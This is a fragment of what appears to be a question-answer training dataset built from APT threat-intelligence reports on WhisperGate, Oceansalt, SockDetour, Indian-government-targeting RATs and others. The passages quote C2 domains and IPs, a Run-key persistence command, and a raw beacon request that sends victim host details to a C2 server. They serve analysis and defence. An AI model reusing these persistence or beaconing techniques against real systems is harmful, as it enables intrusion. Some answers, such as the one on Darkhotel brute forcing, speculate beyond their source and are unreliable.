    "instruction": "Small Headline: Recovery and Reconstitution Planning\nA is a key component of contingency planning and preparation. The overall output of a BIA will provide an organization with two key components (as related to critical mission/business operations):\n\u2022 Characterization and classification of system components, and\n\u2022 Interdependencies.\nBased upon the identification of an organization's mission critical assets (and their associated interdependencies), in the event that an organization is impacted by destructive malware, recovery and reconstitution efforts should be considered.\nTo plan for this scenario, an organization should address the availability and accessibility for the following resources (and should include the scope of these items within incident response exercises and scenarios):\n\u2022 Comprehensive inventory of all mission critical systems and applications:\no Versioning information,\no System/application dependencies,\no System partitioning/storage configuration and connectivity, and\no Asset owners/points of contact.\n\u2022 Contact information for all essential personnel within the organization,\n\u2022 Secure communications channel for recovery teams,\n\u2022 Contact information for external organizational-dependent resources:\no Communication providers,\no Vendors (hardware/software), and\no Outreach partners/external stakeholders\n\u2022 Service contract numbers \u2013 for engaging vendor support,\n\u2022 Organizational procurement points of contact,\n\u2022 Optical disc image (ISO)/image files for baseline restoration of critical systems and applications:\no OS installation media,\no Service packs/patches,\no Firmware, and\no Application software installation packages.\n\u2022 Licensing/activation keys for OS and dependent applications,\n\u2022 Enterprise network topology and architecture diagrams,\n\u2022 System and application documentation,\n\u2022 Hard copies of operational checklists and playbooks,\n\u2022 System and application configuration backup files,\n\u2022 Data backup files (full/differential),\n\u2022 System and application security baseline and hardening checklists/guidelines, and\n\u2022 System and application integrity test and acceptance checklists.\nSmall Headline: Incident Response\nVictims of a destructive malware attacks should immediately focus on containment to reduce the scope of affected systems. Strategies for containment include:\n\u2022 Determining a vector common to all systems experiencing anomalous behavior (or having been rendered unavailable)\u2014from which a malicious payload could have been delivered:\no Centralized enterprise application,\no Centralized file share (for which the identified systems were mapped or had access),\no Privileged user account common to the identified systems,\no Network segment or boundary, and\no Common Domain Name System (DNS) server for name resolution.\n\u2022 Based upon the determination of a likely distribution vector, additional mitigation controls can be enforced to further minimize impact:\no Implement network-based ACLs to deny the identified application(s) the capability to directly communicate with additional systems,\n\uf0a7 Provides an immediate capability to isolate and sandbox specific systems or resources.\no Implement null network routes for specific IP addresses (or IP ranges) from which the payload may be distributed,\n\uf0a7 An organization's internal DNS can also be leveraged for this task, as a null pointer record could be added within a DNS zone for an identified server or application.\no Readily disable access for suspected user or service account(s),\no For suspect file shares (which may be hosting the infection vector), remove access or disable the share path from being accessed by additional systems, and\no Be prepared to, if necessary, reset all passwords and tickets within directories (e.g., changing golden/silver tickets).\nAs related to incident response and incident handling, organizations are encouraged to report incidents to the FBI and CISA (see the Contact section below) and to preserve forensic data for use in internal investigation of the incident or for possible law enforcement purposes. See for more information.\nSmall Headline: APPENDIX: Additional IOCS Associated with WhisperGate\nThe hashes in Table 3 contain malicious binaries, droppers, and macros linked to WhisperGate cyber actors activity. The binaries are predominantly .Net and are obfuscated. Obfuscation varies; some of the binaries contain multiple layers of obfuscation. Analysis identified multiple uses of string reversal, character replacement, base64 encoding, and packing. Additionally, the malicious binaries contain multiple defenses including VM checks, sandbox detection and evasion, and anti-debugging techniques. Finally, the sleep command was used in varying lengths via PowerShell to obfuscate execution on a victim's network.\nAll Microsoft .doc files contain a malicious macro that is base64 encoded. Upon enabling the macro, a PowerShell script runs a sleep command and then downloads a file from an external site. The script connects to the external website via HTTP to download an executable. Upon download, the executable is saved to C:\\Users\\Public\\Documents\\ filepath on the victim host.\nAn identified zip file was found to contain the Microsoft Word file macro_t1smud.doc. Once the macro is enabled, a bash script runs a sleep command and the script connects to htxxps://the.earth.li/~sgtatham/putty/latest/w32/putty.exe. This binary is likely the legitimate Putty Secure Shell binary. Upon download the file is saved to C:\\Users\\Public\\Documents\\ file path.\n\nBased on the above text, answer a question. What specific resources should an organization prepare and maintain to effectively respond to a destructive malware attack? How do these resources facilitate the recovery process?",
    "output": "An organization should prepare and maintain a comprehensive inventory of all mission-critical systems and applications, including versioning information, system/application dependencies, system partitioning/storage configuration and connectivity, and asset owners/points of contact. Additionally, they should have contact information for all essential personnel, secure communication channels for recovery teams, contact information for external organizational-dependent resources, service contract numbers, organizational procurement points of contact, optical disc images (ISO)/image files for baseline restoration of critical systems and applications, licensing/activation keys for OS and dependent applications, enterprise network topology and architecture diagrams, system and application documentation, hard copies of operational checklists and playbooks, system and application configuration backup files, data backup files (full/differential), system and application security baseline and hardening checklists/guidelines, and system and application integrity test and acceptance checklists. These resources facilitate the recovery process by ensuring that the organization has all the necessary information and tools readily available to restore systems and applications to their pre-attack state efficiently.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Appendix 3 Introduction of Qi'anxin Mobile Products\nQi'anxin Mobile Terminal Security Management System ( Tianji ) is aimed at customers in public security , justice , government , finance , operators , energy , manufacturing and other industries . Terminal control and strong terminal security features _A unique mobile terminal security management product . The product is based on Qi Anxin 's security technology accumulation and operation experience on massive mobile terminals , from hardware , OS , application , data to link and other multi -levelSecurity protection solutions to ensure the security of enterprise data and applications in mobile terminals .\nQi'anxin Mobile Situational Awareness System is a mobile situational awareness management product jointly launched by Qi'anxin Security Supervision BG Situational Awareness First Division and its partner Qi'anxin Virus Response Center Mobile Team. Different from traditional mobile security vendors, which focus on APP production and release, and provide customers with APP reinforcement, detection, analysis, etc.; mobile situational awareness is oriented to customers with regulatory responsibilities, focusing more on APP download and use, and find out the scope of the jurisdiction. The use of APP provides customers with functions such as APP illegal detection, compliance analysis, and traceability.\n\nBased on the above text, answer a question. How does the Qi'anxin Mobile Terminal Security Management System (Tianji) ensure the security of enterprise data and applications in mobile terminals, and what makes it unique compared to traditional mobile security vendors?",
    "output": "The Qi'anxin Mobile Terminal Security Management System (Tianji) ensures the security of enterprise data and applications in mobile terminals through multi-level security protection solutions that cover hardware, operating system, application, data, and network links. This comprehensive approach is based on Qi'anxin's extensive security technology and operational experience with large-scale mobile terminals. Unlike traditional mobile security vendors that focus on APP production, release, and services like reinforcement, detection, and analysis, Tianji stands out by offering a unique product aimed at various industries including public security, justice, government, finance, operators, energy, and manufacturing. Additionally, Qi'anxin's Mobile Situational Awareness System, developed in collaboration with the Qi'anxin Virus Response Center Mobile Team, focuses on regulatory customers and provides functions such as APP illegal detection, compliance analysis, and traceability, emphasizing the usage and download of apps within the jurisdiction.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: File Details\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key in the current user's hive which will execute the next time the victim user accesses the system.\nRegistry Persistence Key\nRegistry Key Value\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\nRundll32.exe \"%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx\",Setup\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete, search, and execute files as well as list drivers on the system. The binary is designed to be called from its one exported function, \"Setup\"; the Run key will ensure that whenever the victim user logs into the system the backdoor will execute. The binary is configured to communicate to \"www.microsoftservices.proxydns.com\" on port 80 using standard HTTP POST and GET requests. The domain at the time of this report resolved to the IP address, \"103.229.125.157\". Additionally the dynamic DNS domains \"fighthard.mooo.com\" and \"rampage.freetcp.com\" have both historically resolved to this IP address.\nMedium Headline: Example initial beacon request:\nGET /login?wd=hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-\nH5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH-nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==\nHTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)\nHost: www.microsoftservices.proxydns.com\nCache-Control: no-cache\nThe above beacon request can be decoded by base64 decoding with this alphabet,\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\". Then RC4 decrypting the resulting string using the first four bytes of the payload as the decryption key. The following python script will make this easy:\nfrom Crypto.Cipher import ARC4 import base64,binascii,string\ndef customb64decode(s): newalphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_' oldalphabet = string.uppercase + string.lowercase + string.digits + \"+/\" s = s.translate(string.maketrans(newalphabet, oldalphabet)) return base64.b64decode(s)\nreq = \"hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-\nH5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH-nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==\" unb64 = customb64decode(req) rc4 = ARC4.new(unb64[0:4]) dec = rc4.decrypt(unb64[4::]) print dec\nDecoding the string will yield the following: k:9C18CDFE\ns:masst\nh:<HOSTNAME>\nu:<USERNAME>\no:win32.5.1.2600.2.1.Service Pack 3\nm:<MAC ADDRESS>\nWhere k: is a unique identifier for the victim, s: is a campaign identifier included in the backdoor, h: is the hostname of the victim computer, u: is the victim user, o: is the operating system and service pack level, and m is the mac address.\nBased upon some cursory analysis the backdoor will look for encrypted commands within HTML comments returned from the C2 using the following format: \"<!\u00ad\u00ad?*$@COMMAND GOES HERE@$*?\u00ad\u00ad!>;\"however, the C2 was not active at the time of analysis so this could not be confirmed. The backdoor may also make requests to the C2 over HTTP using the following parameters in the URI string \"query?sid=\" and \"result? sid=\".\nThe PDB path, C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb, was also left in the backdoor although no other instances of this path could be identified. Several additional exploit documents were identified by investigating the domains \"fighthard.mooo.com\" and \"rampage.freetcp.com\".\nMedium Headline: File Details\nI'm always curious when no registry changes are made in the exploitation process. At first the backdoor failed to load or really do anything in my VM until I read what the \"msascm32.drv\" file does. Looking at the original file's (%WINDIR%\\system32\\msacm32.drv) imported functions, it's clear the DLL is responsible for some type of audio processing and/or playback. A quick search on the internet confirmed this so I added a soundcard to my VM.\nOn reboot explorer.exewas now happy to load the backdoor and get down to business; this technique is known as dll search order hijacking or binary planting. Interestingly the backdoor will also load the legitimate system32\\msacm32.drvfile resolve functions and pass calls to it so it doesn't break audio playback on the victim system. The backdoor contains identical exports as well as an additional dummy function from the legitimate msacm32.drvcalled \"StartWork\" which can be used to reliably identify similar samples. The backdoor routine exists inside the DllMain function so when explorer.exeloads the backdoor via LoadLibrary it will begin spawning malicious threads.\nA PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb; A quick google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80. The two files also have an identical compilation time, which suggests the backdoor is probably not recompiled very often and instead the attacker simply updates the callback configuration information.\nThe backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom backdoor. It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol with the default connection password of \"admin\". The Poison Ivy shellcode is encrypted using a custom cipher with the key \"Tiger324{\" beginning at offset 0xFA5 and ending at 0x159E. If this initial connection fails it will revert to the secondary backdoor, which utilizes HTTP GET and POST requests somewhat similar to the ones described above to the internal IP address \"192.168.2.26\". This suggested the attacker had already compromised other systems in the environment and was using an internal C2 mechanism for a fallback.\n\nQuestion: Why does the malware create a Run key in the current user's hive instead of executing immediately after successful exploitation? What implications does this have for detection and remediation efforts?\n\nAnswer:",
    "output": "The malware creates a Run key in the current user's hive to ensure persistence, meaning it will execute the next time the victim user accesses the system. This approach allows the malware to remain dormant initially, making it harder to detect immediately after infection. For detection and remediation, security professionals need to monitor registry changes and look for suspicious entries in the Run key that might indicate the presence of malware. Removing the Run key entry can prevent the malware from executing on subsequent logins, but further investigation is necessary to ensure complete removal of the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nCTU analysis suggests this activity is related to Iranian threat actors closely aligned with or acting on behalf of the COBALT GYPSY threat group (formerly labeled (<https://www.secureworks.com/research/suspected-iran-based-hacker-group-creates-network-of-fake-linkedin-profiles>)Threat Group-2889). CTU researchers assess with high (<>)confidence that COBALT GYPSY is associated with Iranian government-directed cyber operations, and it has used tactics similar to this campaign:\ntargeting Saudi (<http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/>)financial, oil, and (<http://www.clearskysec.com/oilrig/>)technology organizations\nusing (<https://www.cylance.com/operation-cleaver-cylance>)job-themed lures to infect systems\nregistering spoofed domains\nspearphishing new victims using legitimate email addresses\nThis campaign highlights the need for organizations to educate users about the risks of spearphishing and shortened links. CTU researchers recommend that organizations (<https://support.office.com/en-us/article/Enable-or-disable-macros-in-Office-documents-7B4FDD2E-174F-47E2-9611-9EFE4F860B12>)disable macros in Microsoft Office products to prevent attacks that leverage this functionality. Organizations should also incorporate (<https://www.secureworks.com/capabilities/managed-security/network-security/advanced-malware-protection>)advanced malware prevention technology and (<https://www.secureworks.com/capabilities/managed-security/endpoint-security/endpoint-threat-detection>)endpoint threat detection tools as part of their mitigation strategies.\nBig Headline: Gauging confidence level\nCTU researchers have adopted the grading system (<http://www.dni.gov/files/documents/Newsroom/Press Releases/2007 Press Releases/20071203_release.pdf>)published by the U.S. Office of the Director of National Intelligence to indicate confidence in their assessments:\nHigh confidence generally indicates that judgments are based on high-quality information, and/or that the nature of the issue makes it possible to render a solid judgment. A \"high confidence\" judgment is not a fact or a certainty, however, and such judgments still carry a risk of being wrong.\nModerate confidence generally means that the information is credibly sourced and plausible but not of sufficient quality or corroborated sufficiently to warrant a higher level of confidence.\nLow confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources.\n\nWhy did CTU researchers assess with high confidence that the COBALT GYPSY threat group is associated with Iranian government-directed cyber operations, and what specific tactics did this campaign employ?",
    "output": "CTU researchers assessed with high confidence that the COBALT GYPSY threat group is associated with Iranian government-directed cyber operations because the campaign employed tactics similar to those previously attributed to COBALT GYPSY. These tactics included targeting Saudi financial, oil, and technology organizations; using job-themed lures to infect systems; registering spoofed domains; and spearphishing new victims using legitimate email addresses. The high confidence assessment indicates that the judgments are based on high-quality information and that the nature of the issue allows for a solid judgment, although it is not a certainty and still carries a risk of being wrong.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the NetTraveler malware achieve persistence and what types of data does it exfiltrate by default?",
    "output": "NetTraveler achieves persistence by dropping various files into system directories and using a builder to configure parameters such as the list of stolen file extensions and C2 addresses. By default, NetTraveler exfiltrates common file types such as DOC, XLS, PPT, RTF, and PDF. However, the backdoor configuration can be extended to steal other file types, including Corel Draw designs (.cdr), AutoCAD projects (.dwg, .dxf, .cdw, .dwf), and configuration files (.cfn, .cfg).",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Butterfly APT group utilize CAPEC-66: SQL Injection to compromise their targets?",
    "output": "CAPEC-66: SQL Injection is a type of attack where an attacker injects malicious SQL code into a web application's database in order to extract or modify sensitive data. In the case of the Butterfly APT group, they have been observed using the SQLMap tool to identify and exploit SQL injection vulnerabilities in their targets' web applications. Specifically, it is believed that the group used an SQL injection attack to compromise a JBoss server, which led to the deployment of malware on the target system. The use of SQLMap and the presence of a potentially compromised JBoss server suggest that the Butterfly APT group is leveraging CAPEC-66: SQL Injection as one of their tactics to gain unauthorized access to their targets' systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Control Server\nThe campaign employed multiple control servers. We observed the following IP addresses in implants dating from June to July.\n\u25a0 172.81.132.62\n\u25a0 211.104.160.196\n\u25a0 27.102.112.179\n\u25a0 158.69.131.78\nOur telemetry shows this campaign is operational in several countries. Address 211.104.160.196 indicates infections in Costa Rica, the United States, and the Philippines. Address 158.69.131.78 reveals additional infections in the United States and Canada.\nThese machines resided in numerous countries from August 18\u201321. Because this operation involves multifunction implants, these machines are likely to be part of a larger covert listener network. The Advanced Threat Research team has observed this kind of targeting in similar operations that compromise victims as control server relays.\nBig Headline: Implant Origins\nOur initial investigation into earlier similar samples led us to a variant\u2014bf4f5b4ff7ed9c7275496c07f9836028, compiled in 2010. Oceansalt uses portions of code from this sample; their overall similarity is 21%. The reused code is unique, is not considered a common library or common code, and serves reconnaissance and control.\nThe misclassified sample used a Comment Crew domain. Further investigation revealed the misclassified sample is 99% like Seasalt (), a Comment Crew implant reported to have been used in their operations around 2010. Thus the Oceansalt actor is reusing portions of code from Seasalt to form a new implant. Based on the overall techniques, Oceansalt is unlikely to signal a rebirth of Comment Crew, raising the question of how the actor obtained the Seasalt code. Was it provided to this or another actor, or was it leaked and discovered by this actor? We have been unable to find any evidence in underground or public forums that suggest the source code of Seasalt has been leaked or made available.\nWe discovered another batch of samples compiled on July 16\u201317 that are obfuscated and essentially the same implant, with minor changes such as the control servers. Some of the samples are missing reverse-shell functionality, indicating that this actor has access to Seasalt source code and can compile implants from the original source. This could demonstrate is a level of collaboration between two nation-states on their cyber offensive programs.\nBig Headline: Command and capability similarities\nBoth implants execute their capabilities in the same way, which indicates they were both developed from the same code base. The response codes used by both implants to indicate the success or failure of the commands executed on the endpoint are also an exact match. Some of these similarities:\n\u25a0 Drive reconnaissance capability: Similar code signatures. Both implants use the same codes to indicate the drive type to the control server.\nFigure 18. Similarity in the drive recon functionality. Seasalt is at left.\n\u25a0 File reconnaissance capability: Similar API and code usage to get file information. The response codes sent to the control server to indicate whether a file was found is an exact match.\n\u25a0 Reverse-shell creation capability: Both implants use similar code signatures to create a reverse shell on the infected endpoint. Both reverse shells are based on cmd.exe.\nBig Headline: Code Differences from Seasalt\nThere are a few differences between the two implants in implementation; these demonstrate that Oceansalt is not simply a recompilation of Seasalt source code. However, these differences also provide evidence that Oceansalt is an evolution of Seasalt.\n\u25a0 Encoding: The Oceansalt implant uses an encoding and decoding mechanism before any data is sent to the control server. The Seasalt implant does not use this encoding and sends unencrypted data to the control server.\n\u25a0 Control server address: Oceansalt uses a hardcoded control server address to establish communication. Seasalt parses the control address from its binary by decoding data.\n\u25a0 Persistence: Oceansalt has no persistence mechanisms to ensure continued infection over endpoint reboots. Seasalt, on the other hand, copies itself to C:\\DOCUMEN~1\\<userid>\\java.exe and creates a registry entry to ensure infection after reboot:\n\u2212 HKLM\\Software\\Microsoft\\Windows\\currentVersion\\ Run | sysinfo\nBased on the executable header information, Seasalt was compiled on March 30, 2010. Oceansalt was compiled on June 1, 2018. Highlighting the compilation timestamps is important because, as our preceding analysis demonstrates, the samples have a high degree of code sharing:\n\u25a0 Multiple code matches and similarities\n\u25a0 Multiple functional similarities\n\u25a0 Identical command capabilities\n\u25a0 Same command and response codes issued by and sent to the control server\nThe code used to create the reverse shell in Oceansalt is an exact match with that of Comment Crew's Seasalt implant. The mechanism for creating the reverse shell (pipe-based inter-process communication for standard I/O handles) is also seen in Comment Crew implants such as WebC2-CSON and WebC2-GREENCAT.\nThese matches lead us to believe that Oceansalt is based on Seasalt, because it reuses much of the code base developed 10 years ago. Seasalt's public disclosure in the Comment Crew report does not seem to have discouraged Oceansalt's developer.\nBig Headline: Obfuscated Oceansalt Comparison with Seasalt\nWe offer a comparative analysis of the following partially obfuscated implants against the initial Oceansalt sample and the Seasalt implant from Comment Crew.\nAll the partially obfuscated Oceansalt implants have the following characteristics:\n\u25a0 All implants were compiled during a three-day period: July 16\u201318\n\u25a0 All implants contain debug statements (print logs) written to the log file: C:\\Users\\Public\\Videos\\temp.log\n\u25a0 These debug statements begin with the timestamp and consist of the following keywords at the beginning of the debug message:\n\u2212 [WinMain]\n\u2212 [FraudProc]\n\u25a0 All implants connected to the same control server IP address: 27.102.112.179\n\u25a0 Although none of the partially obfuscated implants contain any additional capabilities (as compared with the initial Oceansalt or Seasalt), some of the partially obfuscated implants are missing the reverse-shell capabilities:\nBig Headline: Evidence of Source-Code Sharing\nWe present evidence of source-code sharing between the Oceansalt authors and Comment Crew, based on our comparative analysis of the three sets of samples: Oceansalt, partially obfuscated Oceansalt, and Seasalt.\n\u25a0 There is no possibility the attackers could have re-instrumented Seasalt by simply modifying the control server IP addresses:\n\u2212 The mechanism for obtaining the address in Seasalt is different from Oceansalt's. Seasalt looks for encoded data at the end of the binary, decodes this data into tokens separated by the marker \"$,\" and obtains the control server information.\n\u2212 Oceansalt implants have the control server IP addresses and port numbers hardcoded as plain-text strings in the binaries\n\u25a0 Some of the partially obfuscated Oceansalt implants are missing the reverse-shell capability. All other capabilities (code signatures, response codes, etc.) and command codes are similar. (Command codes are either the same or off by 1.) Modifying capabilities in this fashion is possible only with access to the source code of Seasalt.\n\u25a0 The presence of debug strings tracing the code flow of the Oceansalt implants indicates they were compiled after adding debug information to the source code of Seasalt:\n\u2212 [WinMain]after recv cmd=%d 0Dh 0Ah\n\u2212 [WinMain]before recv 0Dh 0Ah\n\u2212 [FraudProc]Engine is still active! 0Dh 0Ah\n\u2212 [FraudPRoc]Process Restart! 0Dh 0Ah\n\u25a0 The presence of these debug strings also indicates that the authors who modified the source code may have used these samples to perform their initial testing before obfuscating and releasing the implants to their victims, without scrubbing the debug strings\n\u25a0 The Oceansalt implant\n531dee019792a089a4589c2cce3dac95 (compiled June 1) contains a few key features that indicate compilation from the source code of Seasalt:\n\u2212 Does not contain the reverse-shell capability\n\u2212 Does not contain the drive recon capability\n\u2212 Loads API SHGetFileInfoA() dynamically without statically importing it. This also suggests that Seasalt's source code was modified before compilation.\nBig Headline: Oceansalt Capabilities\nOceansalt is 76KB, a minimal on-disk footprint that is harder to detect than larger malware. The implant has a variety of capabilities for capturing data from the victim's machine using a structured command system. From our research we have determined that this implant is a first-stage component. Further stages are downloaded through its commands. Oceansalt also supports commands enabling the attacker to take various actions on the victim's system.\nBig Headline: Conclusion\nBased on our analysis, the McAfee Advanced Threat Research team has named this global threat Operation Oceansalt. This operation has focused on targets in South Korea and other countries with new malware that has roots in Comment Crew activity from 2010.\nOur research shows that Comment Crew's malware in part lives on in different forms employed by another advanced persistent threat group operating primarily against South Korea. This research represents how threat actors including nation-states might collaborate on their campaigns. McAfee continues to monitor the threat landscape in Asia and around the world to track the evolution of known groups and changes to their techniques.\nAnswer this question: What evidence suggests that the Oceansalt authors had access to the Seasalt source code? How does this impact our understanding of the relationship between the two malware strains?",
    "output": "The evidence suggesting that the Oceansalt authors had access to the Seasalt source code includes the presence of debug strings tracing the code flow, the ability to modify capabilities such as removing the reverse-shell functionality, and the dynamic loading of APIs without statically importing them. These modifications are only possible with access to the source code. This impacts our understanding by confirming a direct linkage between the two malware strains and suggesting potential collaboration or sharing of resources between the actors behind Oceansalt and Comment Crew.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Darkhotel APT group utilize brute force techniques in their attack campaigns?",
    "output": "Brute force is a technique used by adversaries to gain access to accounts by systematically guessing passwords. In the case of the Darkhotel APT group, they utilize brute force to infect executable files on removable drives. Specifically, the virus component of the Darkhotel malware 'simply brute forces the list of mapped removable drives' starting from disk number 4 (D:) to disk number 20 (Z:). This allows the malware to spread and infect multiple systems. Furthermore, the fact that the Darkhotel crew is able to launch sophisticated attacks, including factoring 512-bit RSA keys, suggests that they may also employ brute force techniques in other aspects of their campaigns, such as password cracking. Overall, the use of brute force by Darkhotel highlights the importance of implementing robust password policies and account security measures to prevent such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: File enumerators\nApart from the two RATs, we've also observed specialized reconnaissance malware being deployed on the victim's endpoints instead of a RAT family. The attackers deployed a preliminary recon tool to enumerate specific folders looking for certain file extensions. The file listings/paths found are uploaded to an attacker-controlled C2 server.\nThe locations targeted were:\nC:\\Users\\<current_user>\\Downloads\\\nC:\\Users\\<current_user>\\Desktop\\\nC:\\Users\\<current_user>\\Documents\\\nC:\\Users\\<current_user>\\OneDrive\\Downloads\\\nC:\\Users\\<current_user>\\OneDrive\\Desktop\\\nC:\\Users\\<current_user>\\OneDrive\\Documents\\\nThe file extensions searched for were:\n.txt, .doc, .dot, .wbk, .docx, .docm, .dotx, .dotm, .docb, .xls, .xlt, .xlm, .xlsx, .xlsm, .xltx, .xltm, .xlsb, .xla, .xlam, .xll, .xlw, .ppt, .pot, .pps, .pptx, .pptm, .potx, .potm, .ppam, .ppsx, .ppsm, .sldx, .sldm, .pdf\nFile enumerator malware module looking for specific file extensions.\nMedium Headline: Targeting\nAn extremely common theme of maldocs and archives discovered in this campaign refers to the Government of India's Kavach application. This is a two-factor authentication (2FA) application used by government employees to access their emails. This theme has been used recently by the SideCopy APT's campaigns targeting Indian government personnel, as well. Some of the malicious artifacts using the Kavach theme in the current campaign are named:\nKAVACH-INSTALLATION-VER-1.docm\nKAVACH-INSTALLATION-VER1.5.docm\nKAVACH-INSTALLATION-VER-3.docm\nkavach-2-instructions.zip\nkavach-2-instructions.exe\nKAVACH-INSTALLATION-V3.zip\nKAVACH-INSTALLATION-V3.exe\nOther file names indicating targeting of military and government personnel consist of:\nCONFD-PERS-Letter.docm\nPERS-CONFD-LETTER.exe\nAdmiral_Visit_Details_CONFD.exe\nPay and Allowance Details.xls\nSmall Headline: Compromised websites\nThe attackers have relied on a combination of compromised websites and fake domains to carry out their operations \u2014 a tactic similar to that of the Transparent Tribe APT group. However, what stands out in this campaign is the focus on compromising quasi-military or government-related websites to host malicious payloads. This might have been done to appear legitimate to victims and analysts.\nFor example, the attackers compromised and maintained access to a quasi-defense-related website dsoipalamvihar[.]co[.]in belonging to the Defence Services Officers' Institute (DSOI) using it to host netwireRAT-related payloads since January 2021. In another instance, the attackers compromised the website for the Army Public Schools of India (apsdigicamp[.]com) to host a variety of malicious archives serving NetwireRAT again.\nOn the other hand, the attackers used a fake domain govrn[.]xyz in July 2021 to host maldocs for their infection chains.\nMalicious scripts and payloads hosted on a compromised website.\nMedium Headline: Infrastructure\nThe compromised websites were used heavily to host artifacts from maldocs to RATs. However, these websites hosted a few other malicious artifacts as well. The artifacts scripts were used as:\nEmailers.\nWeb shells.\nFile uploaders.\nNone of these scripts have been written from scratch or customized heavily by the attackers. This practise is in sync with their RAT deployments \u2014 neither the RAT payloads nor the infrastructure scripts have been modified except their configurations. The actual effort instead is put into social engineering and infecting victims.\nSmall Headline: Administration\nThe attackers utilized two types of management scripts to administer the compromised websites. PHP and Perl-based web shells maintain browser-based access to the sites and perform administrative actions such as file management, process management and viewing file contents. The web shells used are:\nPhpSpy\nb374k 2.7\nOlder b374k web shell\nb374k web shell's login page on the compromised site.\nOlder Perl-based b374k web shell hosted on a compromised site.\nThe attackers also deployed a file uploader utility (created by \"Pakistan Haxors Crew\") to upload files to the sites without having to go through the web shells.\nFile uploader.\nBig Headline: Conclusion\nThis campaign has been ongoing since the end of 2020 and continues to operate today. The attackers initially deployed Netwire and Warzone RATs on the infected endpoints. The use of these RATs benefits an adversary twofold \u2014 it makes attribution difficult and saves the effort to create bespoke implants. Beginning in July 2021, however, we observed the deployment of the file enumerators alongside the RATs. This indicates that the attackers are expanding their malware arsenal to target their victims: military and government personnel in India.\nInfection tactics including government-themed lures, deployment of commodity/commercial RATs and file enumerators and the use of compromised and attacker-owned domains indicates a strong resemblance to SideCopy and Transparent Tribe.\nUnlike many crimeware and APT attacks, this campaign uses relatively simple, straightforward infection chains. The attackers have not developed bespoke malware or infrastructure management scripts to carry out their attacks, but the use of prebaked artifacts doesn't diminish the lethality of these attacks. In fact, ready-made artifacts such as commodity or cracked RATs and mailers allow the attackers to rapidly operationalize new campaigns while focusing on their key tactic: tricking victims into infecting themselves.\nAnswer this question: What types of management scripts did the attackers utilize to administer the compromised websites, and what functionalities did these scripts provide?",
    "output": "The attackers utilized two types of management scripts: PHP and Perl-based web shells. These web shells provided browser-based access to the compromised sites and enabled administrative actions such as file management, process management, and viewing file contents. Specifically, the web shells used included PhpSpy and various versions of the b374k web shell. Additionally, the attackers deployed a file uploader utility created by 'Pakistan Haxors Crew' to upload files to the sites without needing to go through the web shells.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Plugin Loading Feature\nAs a backup backdoor, SockDetour serves only one feature of loading a plugin DLL. After the session key sharing, SockDetour receives four bytes of data from the client, which indicates the length of data SockDetour will receive for the final payload delivery stage. The size is expected to be smaller or equal to five MB.\nThe final payload data received is encrypted using the shared session key. After decryption, the received data is expected to be in JSON format with two objects app and args. app contains a base 64-encoded DLL, and args contains an argument to be passed to the DLL. SockDetour loads this plugin DLL in newly allocated memory space, then calls an export function with the name ThreadProc with a function argument in the following JSON structure.\n2 \"sock\": hijacked_socket,\n3 \"key\": session_key,\n4 \"args\": arguments_received_from_client\n5}\nWhile plugin DLL samples were not discovered, the above function argument suggests that the plugin also likely communicates via the hijacked socket and encrypts the transaction using the session key. Thus, we surmise it operates as stealthily as SockDetour does.\n\nBased on the above text, answer a question. In the context of the TiltedTemple campaign, how does the SockDetour backdoor facilitate the loading and execution of a plugin DLL, and what measures are taken to ensure the stealthy operation of this process?",
